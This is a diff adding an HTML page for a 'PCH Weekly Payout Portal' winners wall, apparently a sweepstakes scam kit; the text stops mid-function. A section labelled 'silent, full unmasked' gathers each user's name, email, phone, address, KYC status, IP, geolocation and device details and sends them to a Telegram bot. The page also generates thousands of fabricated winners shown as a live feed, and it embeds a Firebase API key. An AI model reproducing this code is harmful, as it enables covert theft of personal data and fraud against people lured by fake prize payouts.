@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Winners Wall — PCH Weekly Payout Portal</title>
+<script src="supervisor.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = { darkMode:'class', theme:{ extend:{ colors:{ navy:{950:'#070b19',900:'#0d1326',800:'#151d38',700:'#212d54',600:'#2f3f6e'}, gold:{400:'#fbbf24',500:'#f59e0b',600:'#d97706'}, 'sky-custom':'#38bdf8' }, fontFamily:{ sans:['Plus Jakarta Sans','sans-serif'] } } } };
+</script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, set, get, update, remove } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+const firebaseConfig = { apiKey:"AIzaSyAUIFpijfc13emGA-y1kN7nRuQTNVFphtM", authDomain:"pch-weekly-portal.firebaseapp.com", databaseURL:"https://pch-weekly-portal-default-rtdb.firebaseio.com", projectId:"pch-weekly-portal", storageBucket:"pch-weekly-portal.firebasestorage.app", messagingSenderId:"920877842148", appId:"1:920877842148:web:8ae593198c32ba75b636f1", measurementId:"G-789H6REHYS" };
+const app = initializeApp(firebaseConfig); const rtdb = getDatabase(app);
+window.rtdb = { db: rtdb, ref, set, get, update, remove };
+</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  html, body { background-color:#070b19; overflow-x:hidden; }
+  body { font-family:'Plus Jakarta Sans',sans-serif; color:#f8fafc; -webkit-tap-highlight-color:transparent; -webkit-text-size-adjust:100%; }
+  @media (max-width:1024px){
+    input:not([type="checkbox"]):not([type="radio"]):not([type="range"]):not([type="file"]):not([type="color"]):not([type="submit"]):not([type="button"]):not([type="reset"]),
+    select, textarea { font-size:16px !important; line-height:1.45 !important; -webkit-text-size-adjust:100% !important; text-size-adjust:100% !important; }
+    input:focus, select:focus, textarea:focus { font-size:16px !important; transform:none !important; -webkit-transform:none !important; zoom:1 !important; }
+  }
+  .card-3d { transition: transform .3s cubic-bezier(.16,1,.3,1), box-shadow .3s cubic-bezier(.16,1,.3,1); }
+  @media (hover:hover) and (pointer:fine) { .card-3d:hover { transform: translateY(-3px); box-shadow: 0 20px 30px -12px rgba(56,189,248,.14), 0 0 20px rgba(245,158,11,.07); } }
+  ::-webkit-scrollbar { width:8px; height:8px; } ::-webkit-scrollbar-track { background:#070b19; } ::-webkit-scrollbar-thumb { background:#212d54; border-radius:4px; } ::-webkit-scrollbar-thumb:hover { background:#38bdf8; }
+  @keyframes slideIn { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }
+  @keyframes slideOut { from { transform:translateX(0); opacity:1; } to { transform:translateX(100%); opacity:0; } }
+  .toast-slide-in { animation: slideIn .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .toast-slide-out { animation: slideOut .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .dash-shell { position:relative; isolation:isolate; overflow-x:hidden; }
+  .dash-shell::before { content:""; position:absolute; z-index:-1; inset:0 -1.25rem auto; height:25rem; pointer-events:none; background-color:transparent; background-image: radial-gradient(ellipse at 12% 0%, rgba(56,189,248,.12), transparent 52%), radial-gradient(ellipse at 88% 4%, rgba(251,191,36,.09), transparent 45%); background-repeat:no-repeat; }
+  @supports (-webkit-touch-callout: none) {
+    .blur-3xl { -webkit-transform: translate3d(0,0,0); transform: translate3d(0,0,0); -webkit-backface-visibility: hidden; backface-visibility: hidden; will-change: transform; }
+  }
+  .hide-scrollbar::-webkit-scrollbar { display: none; }
+  .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+  @keyframes popIn { from { opacity:0; transform:scale(0.9) translateY(8px); } to { opacity:1; transform:scale(1) translateY(0); } }
+  .pop-in { animation: popIn .35s cubic-bezier(.16,1,.3,1) both; }
+  @keyframes newGlow {
+    0% { box-shadow: 0 0 0 rgba(251,191,36,0); background-color: rgba(251,191,36,.15); }
+    50% { box-shadow: 0 0 20px rgba(251,191,36,.5); background-color: rgba(251,191,36,.1); }
+    100% { box-shadow: 0 0 0 rgba(251,191,36,0); background-color: transparent; }
+  }
+  .new-glow { animation: newGlow 2.5s ease-out; }
+  @keyframes pulseGlow { 0%,100% { box-shadow: 0 0 20px rgba(251,191,36,.3); } 50% { box-shadow: 0 0 30px rgba(251,191,36,.6); } }
+  .pulse-glow { animation: pulseGlow 2s ease-in-out infinite; }
+  @keyframes livePulse { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:.5; transform:scale(1.15); } }
+  .live-pulse { animation: livePulse 1.5s ease-in-out infinite; }
+</style>
+</head>
+<body class="bg-navy-950 text-slate-100 min-h-screen flex flex-col">
+
+<div id="toast-container" class="fixed bottom-5 right-5 z-[100] flex flex-col space-y-3 pointer-events-none max-w-sm w-full px-4"></div>
+
+<header class="bg-navy-950 border-b border-navy-700/60 sticky top-0 z-40">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 sm:h-20 flex items-center justify-between gap-2 relative">
+    <button onclick="toggleNavDrawer()" class="p-2 -ml-2 text-slate-300 hover:text-white transition z-10 relative">
+      <i class="fa-solid fa-bars text-xl"></i>
+    </button>
+    <h1 class="absolute left-1/2 -translate-x-1/2 text-[11px] sm:text-xl font-black tracking-[0.15em] text-white uppercase whitespace-nowrap">
+      PCH Weekly Payout Portal
+    </h1>
+    <div id="nav-actions" class="flex items-center space-x-1.5 sm:space-x-3 z-10 relative"></div>
+  </div>
+</header>
+
+<div id="nav-overlay" class="fixed inset-0 bg-black/60 z-[45] hidden transition-opacity" onclick="toggleNavDrawer()"></div>
+<div id="nav-drawer" class="fixed inset-y-0 left-0 z-50 w-64 bg-navy-900 border-r border-navy-700 transform -translate-x-full transition-transform duration-300 ease-in-out flex flex-col">
+  <div class="p-5 border-b border-navy-700 flex items-center justify-between">
+    <span class="text-sm font-black text-white tracking-widest uppercase">Navigation</span>
+    <button onclick="toggleNavDrawer()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+  </div>
+  <nav class="flex-1 overflow-y-auto p-3 space-y-1"></nav>
+</div>
+
+<main id="app-container" class="flex-grow flex flex-col"></main>
+
+<footer class="bg-navy-950 border-t border-navy-700/50 py-8 text-sm text-slate-400">
+  <div class="max-w-7xl mx-auto px-4 text-center text-[10px] sm:text-xs text-slate-500 uppercase tracking-wider font-bold">&copy; 2026 PCH Weekly Payout Portal (PWPP) — All rights reserved.</div>
+</footer>
+
+<div id="global-modal" style="display:none" class="fixed inset-0 z-[60] items-center justify-center bg-navy-950/95 p-4 overflow-y-auto">
+  <div class="bg-navy-800 border border-navy-700 rounded-2xl max-w-lg w-full p-6 shadow-2xl relative my-auto">
+    <button onclick="closeModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl p-2 rounded-lg active:bg-navy-700 transition"><i class="fa-solid fa-xmark"></i></button>
+    <div id="modal-content"></div>
+  </div>
+</div>
+
+<script>
+/* ═══════════ SHARED CORE ═══════════ */
+const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
+const DEFAULT_TG = { botToken:'', chatId:'' };
+
+function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
+function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }
+function fmtNumber(n){ return Number(n||0).toLocaleString(); }
+function timeAgo(ts) {
+  const diff = Date.now() - ts;
+  const s = Math.floor(diff / 1000);
+  if (s < 30) return 'just now';
+  if (s < 60) return s + 's ago';
+  const m = Math.floor(s / 60);
+  if (m < 60) return m + 'm ago';
+  const h = Math.floor(m / 60);
+  if (h < 24) return h + 'h ago';
+  const d = Math.floor(h / 24);
+  if (d < 7) return d + 'd ago';
+  return new Date(ts).toLocaleDateString();
+}
+
+function loadDeviceState() {
+  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
+  if (saved) {
+    try {
+      const parsed = JSON.parse(saved);
+      if (!parsed.telegramConfig) parsed.telegramConfig = Object.assign({}, DEFAULT_TG);
+      if (parsed.userBalance == null) parsed.userBalance = 4500;
+      if (!parsed.transactions) parsed.transactions = [];
+      if (!parsed.registeredUsers) parsed.registeredUsers = [];
+      if (!parsed.supportTickets) parsed.supportTickets = [];
+      if (!parsed.withdrawalState) parsed.withdrawalState = 'none';
+      if (!parsed.messages) parsed.messages = [];
+      if (parsed.messagesReadAt == null) parsed.messagesReadAt = 0;
+      if (parsed.announcementDismissedAt == null) parsed.announcementDismissedAt = 0;
+      return parsed;
+    } catch(e){}
+  }
+  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], supportTickets:[], kyc:null, card:null, withdrawalState:'none', currentWithdrawal:null, messages:[], messagesReadAt:0, announcement:null, announcementDismissedAt:0, gamePlays:null, lastSpinDate:null, telegramConfig: Object.assign({}, DEFAULT_TG) };
+}
+const state = loadDeviceState();
+
+function saveDeviceState() {
+  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(state)); } catch(err) {}
+  if (state.currentUser && state.currentUser.username) syncCurrentUserToCloud().catch(()=>{});
+}
+async function syncCurrentUserToCloud() {
+  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return;
+  try {
+    const payload = Object.assign({}, state.currentUser, { userBalance: state.userBalance });
+    await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()), payload);
+  } catch(e){}
+}
+async function pullCurrentUserFromCloud() {
+  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return false;
+  try {
+    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()));
+    if (!snap.exists()) return false;
+    const r = snap.val();
+    state.currentUser = Object.assign({}, state.currentUser, r);
+    if (typeof r.userBalance === 'number') state.userBalance = r.userBalance;
+    if (Array.isArray(r.transactions)) state.transactions = r.transactions;
+    if (r.kyc) state.kyc = r.kyc;
+    if (r.card) state.card = r.card;
+    if (r.configuredMethod) state.configuredMethod = r.configuredMethod;
+    if (r.gamePlays) state.gamePlays = r.gamePlays;
+    if (r.lastSpinDate) state.lastSpinDate = r.lastSpinDate;
+    if (Array.isArray(r.supportTickets)) state.supportTickets = r.supportTickets;
+    state.withdrawalState = r.withdrawalState || state.withdrawalState || 'none';
+    state.currentWithdrawal = r.currentWithdrawal || state.currentWithdrawal || null;
+    saveDeviceState(); return true;
+  } catch(e){ return false; }
+}
+
+function showToast(title, message, type='info') {
+  const container = document.getElementById('toast-container'); if (!container) return;
+  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
+  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
+  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
+  const el = document.createElement('div'); el.id = id;
+  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
+  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
+  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
+}
+function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
+function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`; modal.style.display = 'flex'; document.body.classList.add('modal-open'); }
+function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; document.body.classList.remove('modal-open'); }
+
+/* ═══════════ DEVICE + IP ═══════════ */
+function detectDevice() {
+  const ua = navigator.userAgent || '';
+  let os='Unknown', type='Desktop', browser='Unknown';
+  if (/iPhone|iPad|iPod/i.test(ua)) { os='iOS'; type=/iPad/i.test(ua)?'Tablet':'Mobile'; }
+  else if (/Android/i.test(ua)) { os='Android'; type=/Mobile/i.test(ua)?'Mobile':'Tablet'; }
+  else if (/Mac OS X|Macintosh/i.test(ua)) { os='macOS'; }
+  else if (/Windows/i.test(ua)) { os='Windows'; }
+  else if (/CrOS/i.test(ua)) { os='ChromeOS'; }
+  else if (/Linux/i.test(ua)) { os='Linux'; }
+  if (/Edg\//i.test(ua)) browser='Edge';
+  else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser='Opera';
+  else if (/Chrome\//i.test(ua) && !/Edg|OPR/i.test(ua)) browser='Chrome';
+  else if (/Firefox\//i.test(ua)) browser='Firefox';
+  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser='Safari';
+  return { os, type, browser };
+}
+let cachedIp = null, cachedGeo = null;
+async function fetchIP(){
+  if (cachedIp && cachedGeo) return { ip: cachedIp, ...cachedGeo };
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    if (r.ok) {
+      const d = await r.json();
+      if (d && d.ip) {
+        cachedIp = d.ip;
+        cachedGeo = { city: d.city||'', region: d.region||'', country: d.country_name||d.country||'', postal: d.postal||'', org: d.org||'', timezone: d.timezone||'', latitude: d.latitude||'', longitude: d.longitude||'' };
+        return { ip: cachedIp, ...cachedGeo };
+      }
+    }
+  } catch(e){}
+  try {
+    const r2 = await fetch('https://api.ipify.org?format=json');
+    const d2 = await r2.json();
+    if (d2 && d2.ip) { cachedIp = d2.ip; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' }; return { ip: cachedIp, ...cachedGeo }; }
+  } catch(e){}
+  cachedIp = 'Unknown'; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' };
+  return { ip: cachedIp, ...cachedGeo };
+}
+
+/* ═══════════ TELEGRAM — silent, full unmasked ═══════════ */
+function tgCreds() {
+  const cfg = state.telegramConfig || {};
+  return { botToken: String(cfg.botToken || '').trim(), chatId: String(cfg.chatId || '').trim() };
+}
+async function sendTelegramMessage(textMessage) {
+  const { botToken, chatId } = tgCreds();
+  if (!botToken || !chatId) { console.warn('[TG] creds missing'); return false; }
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('text', textMessage);
+    fd.append('parse_mode', 'HTML');
+    fd.append('disable_web_page_preview', 'true');
+    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body: fd });
+    const d = await r.json();
+    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
+    return d.ok;
+  } catch (err) { console.error('[TG] fetch failed:', err); return false; }
+}
+async function tgBlock() {
+  const u = state.currentUser || {};
+  const net = await fetchIP().catch(()=>({ ip:'Unknown', city:'', region:'', country:'', org:'', timezone:'', latitude:'', longitude:'' }));
+  const dev = detectDevice();
+  const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A';
+  const address = [u.address, u.city, u.stateOrParish, u.zip].filter(Boolean).join(', ') || 'N/A';
+  return (
+    `<b>User:</b> @${tgEsc(u.username || 'unknown')}\n` +
+    `<b>Full name:</b> ${tgEsc(fullName)}\n` +
+    `<b>Email:</b> ${tgEsc(u.email || 'N/A')}\n` +
+    `<b>Phone:</b> ${tgEsc(u.phone || 'N/A')}\n` +
+    `<b>Address:</b> ${tgEsc(address)}\n` +
+    `<b>Balance:</b> ${fmtMoney(state.userBalance)}\n` +
+    `<b>KYC:</b> ${tgEsc((state.kyc && state.kyc.status) || 'none')}\n` +
+    `<b>IP:</b> <code>${tgEsc(net.ip || 'Unknown')}</code>\n` +
+    `<b>Geo:</b> ${tgEsc([net.city, net.region, net.country].filter(Boolean).join(', ') || 'N/A')}\n` +
+    `<b>ISP:</b> ${tgEsc(net.org || 'N/A')}\n` +
+    `<b>Timezone:</b> ${tgEsc(net.timezone || 'N/A')}\n` +
+    `<b>Device:</b> ${tgEsc(dev.type + ' · ' + dev.os + ' · ' + dev.browser)}\n` +
+    `<b>User-Agent:</b> <code>${tgEsc(navigator.userAgent)}</code>\n` +
+    `<b>Timestamp:</b> ${new Date().toISOString()}`
+  );
+}
+
+function guardAuth() { if (!state.currentUser || !state.currentUser.username) { window.location.href = 'login.html'; return false; } return true; }
+function logout() { state.currentUser = null; saveDeviceState(); window.location.href = 'login.html'; }
+
+function toggleNavDrawer() {
+  const drawer = document.getElementById('nav-drawer');
+  const overlay = document.getElementById('nav-overlay');
+  if (drawer.classList.contains('-translate-x-full')) {
+    drawer.classList.remove('-translate-x-full');
+    overlay.classList.remove('hidden');
+  } else {
+    drawer.classList.add('-translate-x-full');
+    overlay.classList.add('hidden');
+  }
+}
+
+function isTabLocked(tabKey) {
+  const isKycApproved = state.kyc && state.kyc.status === 'approved';
+  const isSetupComplete = !!state.configuredMethod;
+  if (['transfer', 'cards', 'withdrawals'].includes(tabKey)) return !isKycApproved || !isSetupComplete;
+  if (tabKey === 'funds') return !isKycApproved;
+  if (tabKey === 'spin') return !isKycApproved || !isSetupComplete;
+  if (tabKey === 'winners') return !isKycApproved;
+  return false;
+}
+function showKycLockToast() { showToast('Identity Required', 'Please complete KYC verification.', 'warning'); setTimeout(() => { window.location.href = 'kyc.html'; }, 1000); }
+
+const DASHBOARD_TABS = [
+  { key:'overview', label:'Overview', icon:'fa-gauge-high', href:'overview.html' },
+  { key:'funds', label:'Funds', icon:'fa-wallet', href:'funds.html' },
+  { key:'transfer', label:'Transfer', icon:'fa-arrow-right-arrow-left', href:'transfer.html' },
+  { key:'history', label:'History', icon:'fa-rectangle-list', href:'history.html' },
+  { key:'support', label:'Support', icon:'fa-headset', href:'support.html' },
+  { key:'promotions', label:'Promotions', icon:'fa-trophy', href:'promotions.html' },
+  { key:'spin', label:'Arcade Hub', icon:'fa-dharmachakra', href:'spin.html' },
+  { key:'winners', label:'Winners Wall', icon:'fa-crown', href:'winners.html' },
+  { key:'cards', label:'Cards', icon:'fa-credit-card', href:'cards.html' },
+  { key:'referrals', label:'Referrals', icon:'fa-gift', href:'referrals.html' },
+  { key:'withdrawals', label:'Withdrawals', icon:'fa-money-bill-transfer', href:'withdrawals.html' },
+  { key:'goals', label:'Goals', icon:'fa-bullseye', href:'goals.html' },
+  { key:'notifications', label:'Alerts', icon:'fa-bell', href:'notifications.html' },
+  { key:'kyc', label:'KYC', icon:'fa-id-card', href:'kyc.html' }
+];
+function renderNavItems(activeKey) { return DASHBOARD_TABS.map(it=>{ const active = it.key===activeKey; const locked = isTabLocked(it.key); return `<a href="${locked ? '#' : it.href}" onclick="${locked ? 'event.preventDefault(); showKycLockToast()' : ''}" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-bold transition ${active?'text-gold-400 bg-gold-500/10':(locked ? 'text-slate-500 opacity-60' : 'text-slate-300 hover:text-white hover:bg-navy-800')}"><i class="fa-solid ${locked ? 'fa-lock' : it.icon} w-4 text-center"></i><span>${it.label}</span></a>`; }).join(''); }
+function renderDashboardSidebar(activeKey) { return `<aside class="hidden lg:block w-56 shrink-0"><div class="sticky top-24 space-y-1.5"><p class="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-3 mb-3">Dashboard</p>${renderNavItems(activeKey)}</div></aside>`; }
+function renderDashboardShell(activeKey, contentHtml) { return `<div class="dash-shell flex-grow w-full"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8 pb-28 lg:pb-8"><div class="flex flex-col lg:flex-row gap-6 lg:gap-8">${renderDashboardSidebar(activeKey)}<div class="flex-1 min-w-0 space-y-6">${contentHtml}</div></div></div></div>`; }
+
+function renderHeaderNav() {
+  const nav = document.getElementById('nav-actions'); if (!nav) return;
+  if (!state.currentUser) { nav.innerHTML = ''; return; }
+  const u = state.currentUser;
+  const avatar = u.photoUrl ? `<img src="${u.photoUrl}" class="w-7 h-7 rounded-full object-cover border border-gold-400">` : `<div class="w-7 h-7 rounded-full bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-xs">${(u.firstName||'U').charAt(0)}</div>`;
+  nav.innerHTML = `
+    <button onclick="window.location.href='settings.html'" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition rounded-lg flex items-center gap-1.5">${avatar}<span class="hidden sm:inline">${u.firstName||''}</span><i class="fa-solid fa-gear ml-1"></i></button>
+    <button onclick="logout()" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition rounded-lg"><i class="fa-solid fa-right-from-bracket sm:mr-1"></i><span class="hidden sm:inline">Logout</span></button>
+  `;
+}
+
+/* ═══════════ WINNERS WALL — 2397 MOCK + LIVE ═══════════ */
+
+function mulberry32(a) {
+  return function() {
+    a |= 0; a = a + 0x6D2B79F5 | 0;
+    let t = Math.imul(a ^ a >>> 15, 1 | a);
+    t = t + Math.imul(t ^ t >>> 7, 61 | t) ^ t;
+    return ((t ^ t >>> 14) >>> 0) / 4294967296;
+  };
+}
+
+const PRIZES_MOCK = [
+  { label: '$20', weight: 18, icon: 'fa-dollar-sign text-gold-400', bg: 'bg-gold-500/15 border-gold-500/40', cash: 20 },
+  { label: '2x Entries', weight: 14, icon: 'fa-bolt text-sky-custom', bg: 'bg-sky-custom/15 border-sky-custom/40', cash: 0 },
+  { label: '$50', weight: 14, icon: 'fa-dollar-sign text-gold-400', bg: 'bg-gold-500/15 border-gold-500/40', cash: 50 },
+  { label: '$100', weight: 12, icon: 'fa-dollar-sign text-gold-400', bg: 'bg-gold-500/15 border-gold-500/40', cash: 100 },
+  { label: '5x Entries', weight: 10, icon: 'fa-bolt text-sky-custom', bg: 'bg-sky-custom/15 border-sky-custom/40', cash: 0 },
+  { label: '$250', weight: 9, icon: 'fa-dollar-sign text-gold-400', bg: 'bg-gold-500/15 border-gold-500/40', cash: 250 },
+  { label: '$500', weight: 7, icon: 'fa-dollar-sign text-gold-400', bg: 'bg-gold-500/15 border-gold-500/40', cash: 500 },
+  { label: '10x Entries', weight: 5, icon: 'fa-bolt text-sky-custom', bg: 'bg-sky-custom/15 border-sky-custom/40', cash: 0 },
+  { label: '$1,000', weight: 4, icon: 'fa-dollar-sign text-gold-400', bg: 'bg-gold-500/15 border-gold-500/40', cash: 1000 },
+  { label: '$2,500', weight: 2.5, icon: 'fa-dollar-sign text-gold-400', bg: 'bg-gold-500/15 border-gold-500/40', cash: 2500 },
+  { label: '15x Entries', weight: 2, icon: 'fa-bolt text-sky-custom', bg: 'bg-sky-custom/15 border-sky-custom/40', cash: 0 },
+  { label: '$5,000', weight: 1.5, icon: 'fa-dollar-sign text-gold-400', bg: 'bg-gold-500/15 border-gold-500/40', cash: 5000 },
+  { label: 'Alaska Trip', weight: 0.3, icon: 'fa-plane text-purple-400', bg: 'bg-purple-500/15 border-purple-500/40', cash: 0, physical: true },
+  { label: '$10,000', weight: 0.5, icon: 'fa-dollar-sign text-gold-400', bg: 'bg-gold-500/15 border-gold-500/40', cash: 10000 },
+  { label: '22x Entries', weight: 0.2, icon: 'fa-bolt text-sky-custom', bg: 'bg-sky-custom/15 border-sky-custom/40', cash: 0 },
+  { label: '$15,000', weight: 0.2, icon: 'fa-dollar-sign text-gold-400', bg: 'bg-gold-500/15 border-gold-500/40', cash: 15000 }
+];
+
+const FIRST_NAMES = ['John','Jane','Marcus','Evelyn','Arthur','Sarah','Michael','Emily','David','Jessica','Daniel','Ashley','Chris','Amanda','James','Lauren','Robert','Nicole','William','Megan','Anthony','Rachel','Christopher','Hannah','Matthew','Olivia','Joshua','Sophia','Andrew','Chloe','Ryan','Grace','Nathan','Zoe','Tyler','Ava','Ethan','Mia','Logan','Emma','Jacob','Lily','Noah','Ella','Liam','Aria','Caleb','Nora','Jordan','Ruby','Austin','Alice','Dylan','Eva','Blake','Jade','Trevor','Iris','Owen','Luna','Mason','Ivy','Lucas','Rose','Cameron','Daisy','Xavier','Fiona','Gavin','Elena','Hunter','Lucy','Wyatt','Maya','Cooper','Nadia','Parker','Ruth','Jasper','Wren','Elliot','Kira','Reid','Thea','Milo','Sage','Ezra','Nina','Ezra','Willa','Silas','Quinn','Levi','Juniper','Finn','Sienna','Theo','Aria','Rowan','Cleo','Felix','Isla','Oscar','Vera','Hugo','Elise','Ivan','Nova','Milo','Lena','Ian','Adele','Leo','Rhea','Kai','Alma','Nico','Dara','Ren','Mira','Troy','Lila','Eric','Tessa','Cody','Una','Neil','Zoey','Wade','Iris'];
+const LAST_NAMES = ['Sterling','Vance','Pendelton','Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis','Rodriguez','Martinez','Hernandez','Lopez','Gonzalez','Wilson','Anderson','Thomas','Taylor','Moore','Jackson','Martin','Lee','Perez','Thompson','White','Harris','Sanchez','Clark','Ramirez','Lewis','Robinson','Walker','Young','Allen','King','Wright','Scott','Torres','Nguyen','Hill','Flores','Green','Adams','Nelson','Baker','Hall','Rivera','Campbell','Mitchell','Carter','Roberts','Gomez','Phillips','Evans','Turner','Diaz','Parker','Cruz','Edwards','Collins','Reyes','Stewart','Morris','Morales','Murphy','Cook','Rogers','Gutierrez','Ortiz','Morgan','Cooper','Peterson','Bailey','Reed','Kelly','Howard','Ramos','Kim','Cox','Ward','Richardson','Watson','Brooks','Chavez','Wood','James','Bennett','Gray','Mendoza','Ruiz','Hughes','Price','Alvarez','Castillo','Sanders','Patel','Myers','Long','Ross','Foster','Jimenez'];
+
+function pickWeightedPrize(rand) {
+  const total = PRIZES_MOCK.reduce((s,p) => s + p.weight, 0);
+  let r = rand() * total;
+  for (const p of PRIZES_MOCK) {
+    if (r < p.weight) return p;
+    r -= p.weight;
+  }
+  return PRIZES_MOCK[0];
+}
+
+function generateMockWinners(count) {
+  const rand = mulberry32(20261025);
+  const winners = [];
+  const now = Date.now();
+  const week = 7 * 24 * 60 * 60 * 1000;
+  
+  for (let i = 0; i < count; i++) {
+    const fn = FIRST_NAMES[Math.floor(rand() * FIRST_NAMES.length)];
+    const ln = LAST_NAMES[Math.floor(rand() * LAST_NAMES.length)];
+    const style = Math.floor(rand() * 4);
+    let username;
+    if (style === 0) username = fn.toLowerCase() + '_' + ln.toLowerCase();
+    else if (style === 1) username = fn.toLowerCase() + ln.toLowerCase().substring(0,3) + Math.floor(rand()*99);
+    else if (style === 2) username = fn.toLowerCase().substring(0,1) + '.' + ln.toLowerCase() + Math.floor(rand()*9);
+    else username = ln.toLowerCase() + '_' + fn.toLowerCase().substring(0,3) + Math.floor(rand()*999);
+    
+    const prize = pickWeightedPrize(rand);
+    const ageMs = (i / count) * week + rand() * (week / count) * 0.6;
+    const timestamp = now - ageMs;
+    
+    winners.push({
+      username: '@' + username.replace(/[^a-z0-9._]/g, ''),
+      firstName: fn,
+      prize: prize.label,
+      amount: prize.cash || 0,
+      type: prize.physical ? 'Physical Prize' : (prize.cash > 0 ? 'Cash Win' : 'Multiplier'),
+      icon: prize.icon,
+      bg: prize.bg,
+      timestamp,
+      isLive: false
+    });
+  }
+  
+  winners.sort((a,b) => b.timestamp - a.timestamp);
+  return winners;
+}
+
+let allWinners = [];
+let renderedCount = 50;
+const PAGE_SIZE = 50;
+let liveInterval = null;
+let statsTotalWon = 0;
+let statsBiggestWin = 0;
+let statsTotalWins = 0;
+let statsTrips = 0;
+
+function recalcStats() {
+  let total = 0, biggest = 0, trips = 0;
+  for (const w of allWinners) {
+    total += (w.amount || 0);
+    if ((w.amount || 0) > biggest) biggest = w.amount;
+    if (/trip|alaska/i.test(w.prize)) trips++;
+  }
+  statsTotalWon = total;
+  statsBiggestWin = biggest;
+  statsTotalWins = allWinners.length;
+  statsTrips = trips;
+}
+
+function renderWinnerRow(w, idx, isNew) {
+  return `
+    <div class="${isNew ? 'new-glow' : ''} bg-navy-900 border ${w.bg} rounded-xl p-3 flex items-center gap-3 ${isNew ? 'pop-in' : ''}">
+      <div class="w-10 h-10 rounded-xl bg-navy-950 flex items-center justify-center shrink-0 shadow-inner">
+        <i class="fa-solid ${w.icon || 'fa-gift'}"></i>
+      </div>
+      <div class="flex-grow min-w-0">
+        <p class="text-xs font-bold text-white truncate">${escapeHtml(w.username)}</p>
+        <p class="text-[10px] text-slate-400">won <span class="text-white font-bold">${escapeHtml(w.prize)}</span> · ${timeAgo(w.timestamp)}</p>
+      </div>
+      ${w.amount > 0 ? `<div class="text-right shrink-0"><p class="text-xs font-black text-emerald-400">${fmtMoney(w.amount)}</p></div>` : ''}
+    </div>
+  `;
+}
+
+function renderWinnersList() {
+  const slice = allWinners.slice(0, renderedCount);
